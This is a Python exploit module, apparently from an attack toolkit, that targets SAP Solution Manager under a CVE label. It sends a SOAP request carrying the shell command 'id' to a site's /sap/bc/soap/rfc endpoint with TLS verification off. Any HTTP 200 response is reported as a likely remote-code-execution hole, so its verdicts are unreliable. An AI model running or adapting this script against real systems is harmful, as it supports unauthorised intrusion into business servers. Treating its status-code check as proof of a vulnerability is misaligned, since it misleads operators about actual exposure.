exploits/CVE_2021_3293_sap.py

import requests
from core.printmodels import *

class SAP_Solution_Manager_RCE:
    def __init__(self):
        self.name = "SAP Solution Manager RCE"
        self.description = "SAP Solution Manager Remote Code Execution"
        self.author = "Mrphoenix"

    def Exploit(self, site):
        try:
            endpoint = f"{site}/sap/bc/soap/rfc"
            headers = {"Content-Type": "text/xml;charset=UTF-8"}
            payload = """<?xml version="1.0" encoding="UTF-8"?>
            <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">
                <SOAP-ENV:Header/>
                <SOAP-ENV:Body>
                    <ns1:COMMAND xmlns:ns1="urn:SAPControl">
                        <command>id</command>
                    </ns1:COMMAND>
                </SOAP-ENV:Body>
            </SOAP-ENV:Envelope>"""
            
            response = requests.post(endpoint, data=payload, headers=headers, verify=False, timeout=10)
            if response.status_code == 200:
                return PrintSuccess(f"[SAP] Potentially vulnerable to RCE!")
            return PrintFailed("[SAP] Not Vulnerable")
        except Exception as e:
            return PrintError(f"[SAP] Error: {str(e)}")
